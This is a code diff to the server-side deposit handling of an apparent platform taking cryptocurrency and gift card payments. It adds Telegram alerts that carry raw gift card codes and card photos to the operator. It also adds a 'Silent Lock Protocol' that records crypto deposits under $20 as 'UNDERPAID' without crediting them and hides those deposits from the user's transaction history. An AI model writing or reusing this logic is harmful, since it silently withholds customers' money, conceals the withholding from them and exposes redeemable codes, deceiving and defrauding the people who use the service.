@@ -4,6 +4,7 @@
 import { createClient } from '@/lib/supabaseServer';
 import { generateCryptoAddress } from '@/lib/crypto/CryptoEngine';
 import { createClient as createAdminClient } from '@supabase/supabase-js';
+import { sendTelegramAlert, sendTelegramPhoto } from '@/lib/notifications';
 
 // Helper to create a clean tracking ID for transactions (e.g., PV-XJ82K)
 const generateTrackingId = () => `PV-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
@@ -250,9 +251,13 @@ export async function submitDeposit(formData: FormData) {
     // ==========================================
     // BRANCH B: GIFT CARD LOGIC
     // ==========================================
+    // Inside submitDeposit...
     if (method === 'GIFTCARD') {
       const platform = formData.get('platform') as string;
-      const code = formData.get('code') as string;
+      const gcType = formData.get('gcType') as string; // 'ECODE' or 'PHYSICAL'
+      
+      // If it's a physical card, we just save a placeholder to the DB to keep it clean
+      const code = gcType === 'PHYSICAL' ? '[ PHYSICAL UPLOAD ]' : formData.get('code') as string;
 
       const { error: dbError } = await supabase
         .from('deposits')
@@ -266,7 +271,38 @@ export async function submitDeposit(formData: FormData) {
         }]);
 
       if (dbError) throw dbError;
-      return { success: true };
+
+      // --- THE TELEGRAM NOTIFICATION ROUTING ---
+      const caption = `🚨 <b>New Gift Card Submission</b>\n\n` +
+                      `👤 <b>User:</b> <code>${user.id.slice(0, 8)}</code>\n` +
+                      `💳 <b>Brand:</b> ${platform}\n` +
+                      `💰 <b>Amount:</b> $${amount}\n` +
+                      `📝 <b>Format:</b> ${gcType}\n` +
+                      (gcType === 'ECODE' ? `🔑 <b>Code:</b> <code>${code}</code>` : ``);
+
+      // The Double-Tap buttons
+      const buttons = [
+        [
+          { text: "Approve", callback_data: `pre_approve_${user.id}_${amount}` },
+          { text: "Decline", callback_data: `pre_reject_${user.id}` }
+        ]
+      ];
+
+      if (gcType === 'PHYSICAL') {
+        const imageFile = formData.get('cardImage') as File;
+        if (imageFile && imageFile.size > 0) {
+          // Fire the photo straight to your phone
+          await sendTelegramPhoto(imageFile, caption, buttons);
+        } else {
+          // Fallback if they somehow bypassed the file upload
+          await sendTelegramAlert(caption + "\n\n⚠️ <i>User failed to attach image.</i>", buttons);
+        }
+      } else {
+        // Standard text alert for E-Codes
+        await sendTelegramAlert(caption, buttons);
+      }
+
+      return { success: true }
     }
 
     return { error: "INVALID_METHOD" };
@@ -296,7 +332,8 @@ export async function getLedger() {
 
   const [ordersRes, depositsRes] = await Promise.all([
     supabase.from('orders').select('*').eq('user_id', user.id),
-    supabase.from('deposits').select('*').eq('user_id', user.id)
+    // Added .neq('status', 'UNDERPAID') to hide Ghosted transactions
+    supabase.from('deposits').select('*').eq('user_id', user.id).neq('status', 'UNDERPAID')
   ]);
 
   const history = [
@@ -507,11 +544,44 @@ export async function syncCryptoDeposit(address: string, coin: string) {
     let totalCredited = 0;
 
     // 3. Process each transaction with the exact Live Price
+    // 3. Process each transaction with the exact Live Price
     for (const tx of allTxs) {
       if (tx.tx_output_n === -1) continue; // Skip outgoing transfers
       
       const exactUsdValue = (tx.value / 100000000.0) * livePrice;
 
+      // ==========================================
+      // 🔒 THE SILENT LOCK PROTOCOL (PHASE 1)
+      // ==========================================
+      if (exactUsdValue < 20) {
+        // We log it as UNDERPAID to permanently lock the tx_hash.
+        // It won't update the user's balance, and your frontend order history 
+        // should be set to ignore status: 'UNDERPAID'.
+        
+        // Check if we already locked this one to avoid duplicate errors
+        const { data: existingTx } = await supabase
+          .from('deposits')
+          .select('id')
+          .eq('tx_hash', tx.tx_hash)
+          .maybeSingle();
+
+        if (!existingTx) {
+          await supabase.from('deposits').insert({
+            address: address,
+            platform: coin,
+            amount: exactUsdValue,
+            status: 'UNDERPAID',
+            tx_hash: tx.tx_hash,
+            // Ensure this doesn't accidentally trigger a balance update trigger
+          });
+          console.warn(`[SILENT LOCK] Blocked ${coin} Tx: ${tx.tx_hash} - Value: $${exactUsdValue}`);
+        }
+        
+        continue; // 🛑 Halt processing for this transaction and move to the next
+      }
+      // ==========================================
+
+      // If we pass the $20 check, proceed normally
       const { error } = await supabase.rpc('confirm_crypto_deposit', {
         target_address: address,
         transaction_id: tx.tx_hash,
@@ -521,7 +591,18 @@ export async function syncCryptoDeposit(address: string, coin: string) {
       if (!error) totalCredited += exactUsdValue;
     }
 
-    if (totalCredited > 0) return { success: true };
+    if (totalCredited > 0) {
+      // --- TELEGRAM ALERT FOR CRYPTO ---
+      await sendTelegramAlert(
+        `⚡ <b>CRYPTO DEPOSIT CREDITED</b>\n\n` +
+        `🪙 <b>Coin:</b> ${coin}\n` +
+        `💵 <b>USD Value:</b> $${totalCredited.toFixed(2)}\n` +
+        `📥 <b>Wallet:</b> <code>${address.slice(0, 10)}...</code>\n\n` +
+        `<i>The user balance has been updated automatically.</i>`
+      );
+
+      return { success: true };
+    }
     return { success: false, error: "All visible transactions have already been credited." };
   } catch (error) {
     const errMsg = error instanceof Error ? error.message : "Unknown error";
